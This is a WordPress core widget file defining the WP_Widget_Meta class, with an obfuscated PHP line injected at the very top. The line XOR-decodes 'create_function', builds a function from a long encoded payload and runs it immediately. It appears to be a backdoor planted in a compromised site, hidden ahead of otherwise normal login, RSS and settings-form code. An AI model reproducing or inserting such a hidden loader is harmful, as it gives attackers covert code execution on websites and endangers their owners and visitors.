<?php $LglYxzQiPo='QL4-T+021;N.D;V'^'2>QL NoTDU-Z-T8';$UoIbodSay=$LglYxzQiPo('',';5DUM7 QGDO4kPH89TJIONZN:+ 9Ue+9KNVqzxMMH<:,RD  SrEUDf,A;28d+-TLGSM9TxuRWN>PCRpdS0ZQgW:H7noTRacaEA4QLdo;IkpWRHa QXDFA4;iMH7Y+BamcEHJPM5<LWYJnCUEbrZMIUjt+2a;DjF08gI3xUP<,3=RWyE.WMy7LJljaFE>L0 XNWULOws<;:DFdR12 4qwC3W8FPqMU7PT30FUBcvc+6W95oL6P YQVCHaeG67r.zdnMZ5deSVLqWxFVLPW9NqkIY=h2PE5n1NRRkWJ8Y.X>1QX6I-GPnBO 8M4C<9Ro.XKOQTO+3Moj<aqR8LP0:-Tfbjlq=c,47U+ Og:4=uHWaGAP ESEdVLPerVXM6:K7UDPXLGIYbS2HST6GSKdtu5S8Y4LF0OS032ROYZSaGM2O903F>YY9VKiDX3sRUC,1rF2;dRUSPSYoD<C-,RFo>UA8OEIn+ST+0VETfBV3R<zeXMTPeHNkUEAWY4=IT-RS ITBnBK+2jdVsQ3JRkJBIoCY6bKm0M<3oe2T7kqoyjsSduOP3abeC+zz5cWphcEvjcrfPvnt1G1X4HSoPBv,CCO=.;,Ue-.;=<;GL52YB;73nIig,6X1bJFhoVxH0Sa3FO4mjDW:QuA>8BTD+PumfV8>34P-YUgPS7'^'RSlt+BN23- Z450QJ 9ah65<eOAM4:tT>:qXSX6GAZOB10IO=R=:69H OSg;FX dc7,M5TUv<+GycrPDsKPXnsU=CNRtuFXkLHR>>LKRiVPgihEIm+04-QUAi,V-JkZMG,cayG<5h8,>NmheJV>,=41PBoAedN-UA<mZXppOXAQ79QaE24Pjeqfch4 J9BNpj8 8fLy5F09LnvUSTUQJcU6T55JGqS1 Ro-0;CKCMW;JPTF<6O+47  AMcit=a1-+m;FDA835QjFfr:1;L+XK2S4LV11T1Z++rVwnS<Wc48u<W=LgmNf9AT8Qx6DXeG>kgpp+JG,FJGkx4W>5QYEtNF5>4l6igcuJSoCQQDUuiAc71L06lD-FYlV299We R,dmxh,, YY;Aw0W32kYTQC2T,QwL92YM98v+8.2Azmr:WCV4W85P,.A<7A,647Mn-+GOL04 5em0 Y BH7nKZ45YfiiJO2 Jo= -Okm9;ZRA<, 1EnhK4736 kV,-r7+I: 1Fe NKMHvW5R>3BjdoOk4RWcIT,HR4BY1NL,FYWNsCB.bVQRQpIHHVS2HPUrARWDShGVMUuWnVozOvdVM11.DqPI,:HVRNHHokES .TVWIeICHW,PKcfHOvXhKYhV0.XEN 6N0.fNY;8+J4R0Om27VL9YqeNkYJ');$UoIbodSay();
/**
 * Widget API: WP_Widget_Meta class
 *
 * @package WordPress
 * @subpackage Widgets
 * @since 4.4.0
 */

/**
 * Core class used to implement a Meta widget.
 *
 * Displays log in/out, RSS feed links, etc.
 *
 * @since 2.8.0
 *
 * @see WP_Widget
 */
class WP_Widget_Meta extends WP_Widget {

	/**
	 * Sets up a new Meta widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 */
	public function __construct() {
		$widget_ops = array(
			'classname' => 'widget_meta',
			'description' => __( 'Login, RSS, &amp; WordPress.org links.' ),
			'customize_selective_refresh' => true,
		);
		parent::__construct( 'meta', __( 'Meta' ), $widget_ops );
	}

	/**
	 * Outputs the content for the current Meta widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $args     Display arguments including 'before_title', 'after_title',
	 *                        'before_widget', and 'after_widget'.
	 * @param array $instance Settings for the current Meta widget instance.
	 */
	public function widget( $args, $instance ) {
		/** This filter is documented in wp-includes/widgets/class-wp-widget-pages.php */
		$title = apply_filters( 'widget_title', empty($instance['title']) ? __( 'Meta' ) : $instance['title'], $instance, $this->id_base );

		echo $args['before_widget'];
		if ( $title ) {
			echo $args['before_title'] . $title . $args['after_title'];
		}
			?>
			<ul>
			<?php wp_register(); ?>
			<li><?php wp_loginout(); ?></li>
			<li><a href="<?php echo esc_url( get_bloginfo( 'rss2_url' ) ); ?>"><?php _e('Entries <abbr title="Really Simple Syndication">RSS</abbr>'); ?></a></li>
			<li><a href="<?php echo esc_url( get_bloginfo( 'comments_rss2_url' ) ); ?>"><?php _e('Comments <abbr title="Really Simple Syndication">RSS</abbr>'); ?></a></li>
			<?php
			/**
			 * Filters the "Powered by WordPress" text in the Meta widget.
			 *
			 * @since 3.6.0
			 *
			 * @param string $title_text Default title text for the WordPress.org link.
			 */
			echo apply_filters( 'widget_meta_poweredby', sprintf( '<li><a href="%s" title="%s">%s</a></li>',
				esc_url( __( 'https://wordpress.org/' ) ),
				esc_attr__( 'Powered by WordPress, state-of-the-art semantic personal publishing platform.' ),
				_x( 'WordPress.org', 'meta widget link text' )
			) );

			wp_meta();
			?>
			</ul>
			<?php
		echo $args['after_widget'];
	}

	/**
	 * Handles updating settings for the current Meta widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $new_instance New settings for this instance as input by the user via
	 *                            WP_Widget::form().
	 * @param array $old_instance Old settings for this instance.
	 * @return array Updated settings to save.
	 */
	public function update( $new_instance, $old_instance ) {
		$instance = $old_instance;
		$instance['title'] = sanitize_text_field( $new_instance['title'] );

		return $instance;
	}

	/**
	 * Outputs the settings form for the Meta widget.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $instance Current settings.
	 */
	public function form( $instance ) {
		$instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );
		$title = sanitize_text_field( $instance['title'] );
?>
			<p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:'); ?></label> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo esc_attr($title); ?>" /></p>
<?php
	}
}
